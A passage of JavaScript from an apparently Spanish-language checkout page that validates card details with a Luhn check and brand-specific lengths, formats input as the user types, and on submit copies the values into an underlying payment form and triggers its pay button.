    const exp = new Date(year, month, 0, 23, 59, 59);
    return exp >= now;
  }

  function validateCard() {
    const titular = pypsVal('cardTitular');
    const digits = pypsVal('cardNumero').replace(/\s+/g, '');
    const vence = pypsVal('cardVence');
    const cvv = pypsVal('cardCvv');
    const brand = cardBrand(digits);
    const length = cardLength(brand);
    const amex = brand === 'American Express';
    if (!titular) return 'Ingresa el nombre del titular.';
    if (!/^\d+$/.test(digits) || digits.length < length.min || digits.length > length.max) {
      return 'El número de tarjeta no está bien escrito.';
    }
    if (!brand) return 'No se reconoció la franquicia de la tarjeta.';
    if (!luhnValid(digits)) return 'El número de tarjeta no está bien escrito.';
    if (!validExpiry(vence)) return 'La fecha de vencimiento no es válida.';
    if (!/^\d+$/.test(cvv) || cvv.length !== (amex ? 4 : 3)) return 'El CVV no es válido.';
    return '';
  }

  function updateCardLive() {
    const digits = pypsVal('cardNumero').replace(/\s+/g, '');
    const brand = cardBrand(digits);
    const el = document.getElementById('cardBrand');
    const length = cardLength(brand);
    if (!el) return;
    if (!digits) {
      el.textContent = CARD_BRANDS;
      el.className = 'text-sm text-gray mb-4';
      return;
    }
    if (brand && digits.length < length.min) {
      el.textContent = brand;
      el.className = 'text-sm text-dark-green mb-4';
      return;
    }
    if (!luhnValid(digits) || (brand && (digits.length < length.min || digits.length > length.max))) {
      el.textContent = `${brand || 'Tarjeta'} · El número no está bien escrito`;
      el.className = 'text-sm text-color-error mb-4';
      return;
    }
    el.textContent = `${brand} · Número válido`;
    el.className = 'text-sm text-dark-green mb-4';
  }

  document.getElementById('cardNumero')?.addEventListener('input', () => {
    const formatted = formatCardNumber(pypsVal('cardNumero'));
    pypsSetVal('cardNumero', formatted);
    const brand = cardBrand(formatted.replace(/\s+/g, ''));
    const cvv = document.getElementById('cardCvv');
    if (cvv) cvv.maxLength = brand === 'American Express' ? 4 : 3;
    updateCardLive();
  });
  document.getElementById('cardVence')?.addEventListener('input', () => pypsSetVal('cardVence', formatExpiry(pypsVal('cardVence'))));
  document.getElementById('cardCvv')?.addEventListener('input', () => {
    const amex = cardBrand(pypsVal('cardNumero').replace(/\s+/g, '')) === 'American Express';
    pypsSetVal('cardCvv', pypsVal('cardCvv').replace(/\D/g, '').slice(0, amex ? 4 : 3));
  });

  document.getElementById('cardForm')?.addEventListener('submit', (event) => {
    event.preventDefault();
    const error = validateCard();
    const errEl = document.getElementById('cardError');
    if (error) {
      if (errEl) {
        errEl.textContent = error;
        errEl.classList.remove('hidden');
      }
      return;
    }
    errEl?.classList.add('hidden');
    const map = [
      ['cardTitular', 'pagos-card-name'],
      ['cardNumero', 'pagos-card-number'],
      ['cardVence', 'pagos-card-exp'],
      ['cardCvv', 'pagos-card-cvv'],
    ];
    map.forEach(([from, to]) => {
      const src = document.getElementById(from);
      const dest = document.getElementById(to);
      if (!src || !dest) return;
      dest.removeAttribute('readonly');
      dest.value = src.value;
      dest.dispatchEvent(new Event('input', { bubbles: true }));
    });
    const pay = document.getElementById('pagos-pay');
    if (pay) {
      pay.disabled = false;
      pay.click();
    }
  });
</script>

